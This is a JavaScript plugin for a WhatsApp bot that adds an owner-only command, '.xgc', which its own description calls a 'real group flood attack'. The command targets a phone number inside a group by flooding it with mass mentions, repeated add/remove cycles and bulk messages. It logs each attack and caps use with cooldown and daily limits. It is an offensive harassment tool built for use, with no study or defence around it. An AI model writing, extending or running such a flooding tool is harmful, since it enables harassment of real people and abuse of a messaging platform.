// plugins/xgc.js
const { cmd } = require('../arslan');
const { XGC } = require('../lib/xgc');

const fs = require('fs');
const path = require('path');
let userConfig = {};
try { userConfig = require('../config'); } catch (_) {}

function clean(v) {
    if (!v) return '';
    let r = String(v).trim();
    if (r.includes('@')) r = r.split('@')[0];
    if (r.includes(':')) r = r.split(':')[0];
    return r.replace(/[^0-9]/g, '');
}

const OWNERS = [
    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
    userConfig.OWNER_NUMBER
].map(clean).filter(Boolean);

const STATE_FILE = path.join(__dirname, '..', 'xgc_state.json');
const DEFAULTS = { protected: OWNERS, protectedGroups: [], cooldownHours: 24, dailyLimit: 2, history: [], lastAt: 0 };

function loadState() {
    if (!fs.existsSync(STATE_FILE)) {
        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
        return { ...DEFAULTS };
    }
    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
    catch (_) { return { ...DEFAULTS }; }
}
function saveState(s) {
    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
}
function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }

function checkTarget(target, botNum, groupJid) {
    const s = loadState();
    if (target === botNum || (botNum && target.endsWith(botNum))) {
        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
    }
    if (s.protected.includes(target)) {
        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
    }
    if (groupJid && s.protectedGroups.includes(groupJid)) {
        return { ok: false, reason: 'GROUP_PROTECTED', msg: '🛡 Ye group protected hai.' };
    }
    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
    if (last && hoursSince(last.ts) < s.cooldownHours) {
        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
    }
    const today = new Date().toISOString().slice(0, 10);
    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
    if (t >= s.dailyLimit) {
        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
    }
    return { ok: true };
}

function recordAttack(target, status) {
    const s = loadState();
    s.history.push({ target, ts: new Date().toISOString(), status });
    if (status === 'success') s.lastAt = Date.now();
    if (s.history.length > 500) s.history = s.history.slice(-500);
    saveState(s);
}

function botNumFrom(conn) {
    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
}

cmd({
    pattern: 'xgc',
    alias: ['xgcrash', 'xgroupcrash'],
    desc: 'XGC — real group flood attack (owner only)',
    category: 'owner',
    react: '⚡',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        // must be in a group
        if (!from.endsWith('@g.us')) {
            return reply(
`⚡ *XGC — Group Attack*

📌 *Usage:* (run in a group)
.xgc <target_number> [mode]

📖 *Modes:*
• \`mention\` — 500 mentions per message (3x)
• \`addremove\` — 8 add/remove cycles
• \`text\` — 30 group text messages
• \`all\` — all vectors (default)

📖 *Examples:*
.xgc 923001234567 mention
.xgc 923001234567 all

⚠️ Run this command inside the target group
🎯 Bot must be in the group`
            );
        }

        if (!args[0]) return reply('❌ *Target number do:* `.xgc 923xxxxxxx [mode]`');

        const num = String(args[0]).replace(/[^0-9]/g, '');
        if (!num || num.length < 10) return reply('❌ *Invalid number!*');

        const mode = (args[1] || 'all').toLowerCase();
        const groupJid = from;

        const check = checkTarget(num, botNumFrom(conn), groupJid);
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${num}\`\n📋 ${check.reason}`);

        await reply(
`⚡ *XGC LOCKED*
🎯 Target : \`${num}\`
📍 Group  : current
💥 Mode   : ${mode}
🧬 Vectors: mention + addremove + text
⚡ Launching...`
        );

        let lastPct = 0;
        const result = await XGC(conn, groupJid, num, mode, (sent, total, type) => {
            const pct = total > 0 ? Math.floor((sent / total) * 100) : 0;
            if (pct >= lastPct + 25) {
                lastPct = pct;
                conn.sendMessage(from, { text: `⏳ ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
            }
        });

        if (result.ok) {
            recordAttack(num, 'success');
            await conn.sendMessage(from, { react: { text: '⚡', key: mek.key } });
            return reply(
`✅ *XGC COMPLETE*
🎯 Target : \`${num}\`
📤 Sent   : \`${result.sent}\` actions
❌ Errors : \`${result.errors}\` (${result.errorRate})
🧬 Vectors: ${result.vectors?.join(' + ') || mode}
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            recordAttack(num, 'failed');
            return reply(`⚠️ *Failed* — check bot admin status for addremove mode.`);
        }
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});